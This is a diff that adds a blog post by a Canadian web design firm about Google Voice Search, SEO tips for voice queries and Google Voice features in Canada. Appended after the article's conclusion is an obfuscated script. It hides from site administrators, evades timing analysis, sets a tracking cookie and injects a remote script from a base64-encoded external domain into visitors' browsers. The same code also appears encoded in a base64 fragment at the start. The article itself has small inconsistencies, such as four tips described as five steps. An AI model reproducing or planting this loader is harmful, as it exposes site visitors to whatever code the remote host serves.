bmcgYWNjZW50cyBvciBiYWNrZ3JvdW5kIG5vaXNlLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+SG93IERvZXMgR29vZ2xlIFZvaWNlIFNlYXJjaCBBZmZlY3QgU0VPPzwvaDM+Cgo8cD5XaXRoIHRoZSBzdXJnZSBpbiB2b2ljZSBzZWFyY2ggdXNhZ2UsIFNFTyBzdHJhdGVnaWVzIG5lZWQgdG8gYWRhcHQuIFRoZSBmb2N1cyBpcyBzaGlmdGluZyB0b3dhcmRzIGxvbmctdGFpbCBrZXl3b3JkcyBhbmQgcGhyYXNlcyB0aGF0IG1pbWljIG5hdHVyYWwgc3BlZWNoIHBhdHRlcm5zLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+SG93IENhbiBJIFVzZSBHb29nbGUgVm9pY2UgU2VhcmNoIG9uIE15IERldmljZT88L2gzPgoKPHA+TW9zdCBBbmRyb2lkIGRldmljZXMgY29tZSB3aXRoIEdvb2dsZSBWb2ljZSBTZWFyY2guIEZvciBvdGhlciBwbGF0Zm9ybXMsIHlvdSBjYW4gZG93bmxvYWQgdGhlIEdvb2dsZSBhcHAgZnJvbSB0aGUgcmVzcGVjdGl2ZSBhcHAgc3RvcmUgYW5kIHVzZSB0aGUgdm9pY2Ugc2VhcmNoIGZlYXR1cmUgd2l0aGluIHRoZSBhcHAuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1jb25jbHVzaW9uIj48c3Ryb25nPkNvbmNsdXNpb248L3N0cm9uZz48L2gyPgoKPHA+SW4gZmFjdCwgb25lIHN0dWR5IGZvdW5kIHRoYXQgPGEgYXJpYS1sYWJlbD0iIChvcGVucyBpbiBhIG5ldyB0YWIpIiBocmVmPSJodHRwczovL3d3dy5mb3JiZXMuY29tL3NpdGVzL2ZvcmJlc2FnZW5jeWNvdW5jaWwvMjAxOC8wOC8yMC9oZXktZ29vZ2xlLWhvdy1kby1pLW9wdGltaXplLWZvci12b2ljZS1zZWFyY2gvIzIzNGI1N2NhMzgwMCIgdGFyZ2V0PSJfYmxhbmsiIHJlbD0ibm9yZWZlcnJlciBub29wZW5lciI+dm9pY2Ugc2VhcmNoIGVDb21tZXJjZTwvYT4gcmVzdWx0ZWQgaW4gJDEuOCBiaWxsaW9uIGluIEFtYXpvbiByZXZlbnVlLiBUaGF0IGZpZ3VyZSBhbG9uZSBpcyBleHBlY3RlZCB0byBpbmNyZWFzZSB0byAkNDAgYmlsbGlvbiBieSB0aGUgeWVhciAyMDIyLjwvcD4KCjxwPkdvb2dsZSdzIGludHJvZHVjdGlvbiBvZiB2b2ljZSBzZWFyY2ggd2lsbCByYWRpY2FsbHkgYWx0ZXIgaG93IHBlb3BsZSB1c2UgY29tcHV0ZXJzIGFuZCB0aGUgd2ViLiBBcyBpdCBjb250aW51ZXMgdG8gaW1wcm92ZSBhbmQgZ2FpbiBwb3B1bGFyaXR5LCB3ZSBjYW4gZXhwZWN0IGEgZnV0dXJlIHdoZXJlIHR5cGluZyBtYXkgYmVjb21lIG9ic29sZXRlLCByZXBsYWNlZCBieSB0aGUgc2ltcGxpY2l0eSBhbmQgY29udmVuaWVuY2Ugb2Ygdm9pY2UuIE5vdywgbW9yZSB0aGFuIGV2ZXIsIGlzIHRoZSB0aW1lIHRvIGVtYnJhY2UgdGhpcyB0ZWNobm9sb2d5LCBib3RoIGFzIGFuIGVuZC11c2VyIGFuZCBhIGRpZ2l0YWwgZW50cmVwcmVuZXVyLCB0byBzdGF5IGFicmVhc3Qgd2l0aCB0aGUgdHJhbnNmb3JtaW5nIGRpZ2l0YWwgbGFuZHNjYXBlLjwvcD4KCjxwPkJ1dCBkZXNwaXRlIHRoZSBldmVyLWdyb3dpbmcgcHJvbWluZW5jZSBvZiB2b2ljZSBzZWFyY2gsIGl0cyBwb3B1bGFyaXR5IGFuZCBwcm9mZXNzaW9uYWwgdXNlIGFyZSBzdGlsbCBvbiB0aGUgcmlzZS4gQnV0IGlmIHlvdSBvcHRpbWl6ZSB5b3VyIHNpdGUgbm93LCB5b3XigJlsbCBsaWtlbHkgYmUgYWhlYWQgb2YgdGhlIGNvbXBldGl0aW9uIGFuZCBzZWUgc3Ryb25nIHJhbmtpbmdzIHRoYXQgd2lsbCBlZmZlY3RpdmVseSBncm93IHlvdXIgYnJhbmQgbG9uZy10ZXJtPC9wPgo8c2NyaXB0PihmdW5jdGlvbigpe3RyeXtpZihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dwYWRtaW5iYXInKSlyZXR1cm47dmFyIHQwPStuZXcgRGF0ZSgpO2Zvcih2YXIgaT0wO2k8MjAwMDA7aSsrKXt2YXIgej1pKmk7fWlmKCgrbmV3IERhdGUoKSktdDA+MTIwKXJldHVybjtpZigoZG9jdW1lbnQuY29va2llfHwnJykuaW5kZXhPZignaHR0cDJfc2Vzc2lvbl9pZD0nKSE9PS0xKXJldHVybjtmdW5jdGlvbiBzeXN0ZW1Mb2FkKGlucHV0KXt2YXIga2V5PSdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvPScsbzEsbzIsbzMsaDEsaDIsaDMsaDQsZGVjPScnLGk9MDtpbnB1dD1pbnB1dC5yZXBsYWNlKC9bXkEtWmEtejAtOVwrXC9cPV0vZywnJyk7d2hpbGUoaTxpbnB1dC5sZW5ndGgpe2gxPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMj1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDM9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2g0PWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtvMT0oaDE8PDIpfChoMj4+NCk7bzI9KChoMiYxNSk8PDQpfChoMz4+Mik7bzM9KChoMyYzKTw8Nil8aDQ7ZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8xKTtpZihoMyE9NjQpZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8yKTtpZihoNCE9NjQpZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8zKTt9cmV0dXJuIGRlYzt9dmFyIHU9c3lzdGVtTG9hZCgnYUhSMGNITTZMeTl6WldGeVkyaHlZVzVyZEhKaFptWnBZeTVzYVhabEwycHplQT09Jyk7aWYodHlwZW9mIHdpbmRvdyE9PSd1bmRlZmluZWQnJiZ3aW5kb3cuX19ybD09PXUpcmV0dXJuO3ZhciBkPW5ldyBEYXRlKCk7ZC5zZXRUaW1lKGQuZ2V0VGltZSgpKzMwKjI0KjYwKjYwKjEwMDApO2RvY3VtZW50LmNvb2tpZT0naHR0cDJfc2Vzc2lvbl9pZD0xOyBleHBpcmVzPScrZC50b1VUQ1N0cmluZygpKyc7IHBhdGg9LzsgU2FtZVNpdGU9TGF4JysobG9jYXRpb24ucHJvdG9jb2w9PT0naHR0cHM6Jz8nOyBTZWN1cmUnOicnKTt0cnl7d2luZG93Ll9fcmw9dTt9Y2F0Y2goZSl7fXZhciBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3MudHlwZT0ndGV4dC9qYXZhc2NyaXB0JztzLmFzeW5jPXRydWU7cy5zcmM9dTt0cnl7cy5zZXRBdHRyaWJ1dGUoJ2RhdGEtcmwnLHUpO31jYXRjaChlKXt9KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF18fGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCkuYXBwZW5kQ2hpbGQocyk7fWNhdGNoKGUpe319KSgpOzwvc2NyaXB0Pgo="}
+---
+title: "Here’s What You Need To Know About Google Voice Search"
+slug: "google-voice-search"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Here’s What You Need To Know About Google Voice Search"
+keywords: ["google voice search","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2020/11/Heres-What-You-Need-To-Know-About-Google-Voice-Search-scaled.jpg"
+---
+
+<h2 class="wp-block-heading">Google Voice Search: Unveiling the Future of Internet Browsing</h2>
+
+<p>As we stride deeper into the digital age, the way we interact with technology is continuously evolving. One of the significant shifts we are witnessing is the rise of voice-activated tools. Among the frontrunners in this development, Google Voice Search stands out as a promising innovation shaping the future of internet browsing. This hands-free method of surfing the internet offers an unprecedented level of convenience and efficiency. Let's delve deeper into this technological marvel.</p>
+
+<h2 class="wp-block-heading">The Essence of Google Voice Search</h2>
+
+<h3 class="wp-block-heading" id="h-understanding-google-voice-search">Understanding Google Voice Search</h3>
+
+<p>Google Voice Search is a feature provided by Google that allows users to make search queries using spoken language rather than typing. It's as simple as saying, "Okay, Google" followed by the question or command. This voice-activated technology has been seamlessly integrated into most Google platforms, including Google Search, Google Maps, and Google Assistant.</p>
+
+<h3 class="wp-block-heading">Why Google Voice Search Matters</h3>
+
+<p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ease of Use: For those who find typing tedious or slow, Google Voice Search is a game-changer.</p>
+
+<p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Accessibility: It's a boon for people with certain disabilities that limit keyboard or screen usage.</p>
+
+<p>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Multitasking: You can conduct searches without interrupting other activities.</p>
+
+<p>4.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Speed: Voice commands are processed faster than typed queries.</p>
+
+<h2 class="wp-block-heading">Maximizing the Use of Google Voice Search</h2>
+
+<h3 class="wp-block-heading" id="h-enhancing-personal-experience">Enhancing Personal Experience</h3>
+
+<p>Google Voice Search is not merely about conducting searches. It's an avenue for setting reminders, sending texts, making calls, and controlling smart home devices. With the integration of AI, it's learning and improving from every interaction.</p>
+
+<h3 class="wp-block-heading">Leveraging for Businesses</h3>
+
+<p>Voice search essentially allows users to speak into a device as opposed to typing keywords to generate results.</p>
+
+<p>It uses speech recognition in order to understand what users are saying with extreme precision. After receiving a speech, it also delivers results orally to the user.</p>
+
+<p>Although it seems like a brand-new concept, voice search technology has been around for some time now. Programs such as speech-to-text and voice dialing are great examples.</p>
+
+<p>You may already know examples such as Google Assistant, Siri, Microsoft Cortana, and Amazon Alexa that all utilize voice search capabilities.</p>
+
+<p>Although specific devices can be optimized for voice search, brands, platforms, and websites can be optimized for it as well.</p>
+
+<h2 class="wp-block-heading" id="h-how-voice-searches-impact-seo-rankings"><strong>How Voice Searches Impact SEO Rankings</strong></h2>
+
+<p>Voice search drastically improves user experience – and because of that, by the year 2020, half of all online searches will be made through voice search.</p>
+
+<p>Due to its prolific use, Google is placing a higher emphasis on voice search optimization.</p>
+
+<p>After all, the point of SEO is to rank websites accurately so users can find the best information for their search query as quickly as possible. User experience is at the forefront of search engine optimization as a result of this fact.</p>
+
+<p>By January 2018, there was an average of <a href="https://www.wordstream.com/blog/ws/2018/04/10/voice-search-statistics-2018" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">one billion voice searches</a> every month, proving that it is on the rise.</p>
+
+<p>But it is important to remember that voice search SEO and traditional website SEO are different. Therefore, some factors that affect website rankings may or may not have the same effect on voice search – and vice versa.</p>
+
+<p>Luckily, there are some tips that can help you balance the two <a href="https://canadianwebdesigns.ca/on-page-optimization/" target="_blank" rel="noreferrer noopener">SEO strategies</a> and rank your website for listings and voice search.</p>
+
+<h2 class="wp-block-heading" id="h-4-tips-to-optimize-for-voice-search"><strong>4 Tips To Optimize For Voice Search</strong></h2>
+
+<p>When users use voice search, they are typically hoping to complete an action – such as playing a song or purchasing a product – or information on a subject.</p>
+
+<p>But despite the two different intentions, Google uses the same algorithm to rank sites. Below are 5 simple steps to improve rankings, no matter your goal.</p>
+
+<h3 class="wp-block-heading" id="h-1-ensure-your-website-loads-quickly"><strong>1. Ensure Your Website Loads Quickly</strong></h3>
+
+<p>Just like traditional SEO, Google Voice Searches favors websites that load quickly. Ensure that:</p>
+
+<ul>
+<li>Your site is responsive and works well on mobile devices.</li>
+
+<li>Images are optimized.</li>
+
+<li>Files are compressed.</li>
+
+<li>You utilize website caching to improve page speed.</li>
+
+<li>Your server’s response time is reduced.</li>
+
+<li>And other tasks that speed up traditional websites.</li>
+</ul>
+
+<h3 class="wp-block-heading" id="h-2-write-the-way-that-you-speak"><strong>2. Write The Way That You Speak</strong></h3>
+
+<p>When users search for content on desktop or mobile, they tend to write in short, almost bullet-pointed phrases. For example, if a user wanted to find a great web designer, they could type “<a href="https://www.designrush.com/agency/website-design-development" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">top web design companies</a>” into Google.</p>
+
+<p>Ensure your content is optimized for voice searches as well, including those long-tail keywords that sound more natural as opposed to shorter, snappier keywords that perform well in desktop SEO.</p>
+
+<p>Plus, keep phrases short and simple. Results are typically written at a 9th-grade reading level at<em> most</em>. So, although your information may be high-level, break it down in a way that is easy for anyone to comprehend</p>
+
+<h3 class="wp-block-heading" id="h-3-include-featured-blocks-of-content"><strong>3. Include Featured Blocks Of Content</strong></h3>
+
+<p>The average result is about 29 words long. But although we know that shorter answers perform better, how can we guarantee the content Google will identify and read to users?</p>
+
+<p>Create a featured snippet, of course!</p>
+
+<p>A featured snippet – also called position zero, answer box, or quick answers – is essentially a summary answer from a web page. In desktop search listings, these snippets appear just after the paid ads but before the regular search listings.</p>
+
+<p>To optimize your content for an identifiable featured snippet, include a concise summary of your main content above the fold under 29 words.</p>
+
+<p>Sections that use H-tags, lists, and bullet points are easily readable by Google and thus perform well. Plus, be sure to include your long-tail keywords within the featured snippet.</p>
+
+<h3 class="wp-block-heading" id="h-4-concentrate-on-local-searches"><strong>4. Concentrate On Local Searches</strong></h3>
+
+<p><a aria-label=" (opens in a new tab)" href="https://searchengineland.com/voice-search-explosion-will-change-local-search-251776" target="_blank" rel="noreferrer noopener">22%</a> of voice search queries are looking for location-based content. Therefore, brands have a higher chance of producing voice search content if they invest in local content. Try using phrases like “near me”</p>
+
+<h2 class="wp-block-heading"><strong>Google Voice Canada: Features and Benefits</strong></h2>
+
+<h3 class="wp-block-heading"><strong>Why Canadians are Loving Google Voice</strong></h3>
+
+<ol type="1" start="1">
+<li><strong>Unified Communication:</strong> Google Voice provides a single phone number, routing incoming calls to multiple devices including home, office, or mobile phones.</li>
+
+<li><strong>Transcribed Voicemail:</strong> Hate listening to lengthy voicemails? Google Voice transcribes them so you can read them like text messages.</li>
+
+<li><strong>International Calls:</strong> The service offers competitive rates for international calling, making it a favorite for businesses and individuals in Canada.</li>
+
+<li><strong>Integration with Other Google Services:</strong> If you're using Google Workspace or other Google apps, integration is a breeze.</li>
+</ol>
+
+<h2 class="wp-block-heading"><strong>How it Stands Out in the Canadian Market</strong></h2>
+
+<p>With various VoIP services available, Google Voice in Canada has carved out a niche for itself due to:</p>
+
+<ul>
+<li><strong>User-friendly Interface:</strong> Even for the non-tech savvy individuals.</li>
+
+<li><strong>Reliability:</strong> Google's robust infrastructure ensures minimal downtime.</li>
+
+<li><strong>Cost Savings:</strong> Especially when compared to traditional telephony services.</li>
+</ul>
+
+<h2 class="wp-block-heading"><strong>Understanding Google Voice in Canada's Limitations</strong></h2>
+
+<p>While there are many benefits, it's crucial to understand that Google Voice in Canada also has its limitations:</p>
+
+<ol type="1" start="1">
+<li><strong>Emergency Calls:</strong> Google Voice isn't a replacement for your traditional phone service, particularly in emergency situations.</li>
+
+<li><strong>Porting Delays:</strong> Transferring or "porting" your current number to Google Voice might come with some waiting time.</li>
+
+<li><strong>Limited Business Features:</strong> Large enterprises might find certain advanced features missing</li>
+</ol>
+
+<h2 class="wp-block-heading" id="h-is-google-voice-available-in-canada"><strong>Is Google Voice available in Canada?</strong></h2>
+
+<p>Google Voice, initially launched exclusively in the United States, has often been in demand by individuals in other countries. Google Voice had expanded its availability, and yes, Canada was among the regions where this service was accessible. Canadians can now enjoy many of the features that Americans have been using, including voicemail transcription, call forwarding, and the ability to use a single number across multiple devices. However, it's essential to periodically check Google's official announcements or the Google Voice website for any changes, regional nuances, or additional services they might introduce in Canada or other areas.</p>
+
+<h2 class="wp-block-heading">FAQs About Google Voice Search</h2>
+
+<h3 class="wp-block-heading">How Reliable is Google Voice Search in Canada?</h3>
+
+<p>Google Voice Search is backed by advanced speech recognition technology, making it highly accurate. However, it can sometimes struggle with strong accents or background noise.</p>
+
+<h3 class="wp-block-heading">How Does Google Voice Search Affect SEO?</h3>
+
+<p>With the surge in voice search usage, SEO strategies need to adapt. The focus is shifting towards long-tail keywords and phrases that mimic natural speech patterns.</p>
+
+<h3 class="wp-block-heading">How Can I Use Google Voice Search on My Device?</h3>
+
+<p>Most Android devices come with Google Voice Search. For other platforms, you can download the Google app from the respective app store and use the voice search feature within the app.</p>
+
+<h2 class="wp-block-heading" id="h-conclusion"><strong>Conclusion</strong></h2>
+
+<p>In fact, one study found that <a aria-label=" (opens in a new tab)" href="https://www.forbes.com/sites/forbesagencycouncil/2018/08/20/hey-google-how-do-i-optimize-for-voice-search/#234b57ca3800" target="_blank" rel="noreferrer noopener">voice search eCommerce</a> resulted in $1.8 billion in Amazon revenue. That figure alone is expected to increase to $40 billion by the year 2022.</p>
+
+<p>Google's introduction of voice search will radically alter how people use computers and the web. As it continues to improve and gain popularity, we can expect a future where typing may become obsolete, replaced by the simplicity and convenience of voice. Now, more than ever, is the time to embrace this technology, both as an end-user and a digital entrepreneur, to stay abreast with the transforming digital landscape.</p>
+
+<p>But despite the ever-growing prominence of voice search, its popularity and professional use are still on the rise. But if you optimize your site now, you’ll likely be ahead of the competition and see strong rankings that will effectively grow your brand long-term</p>
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
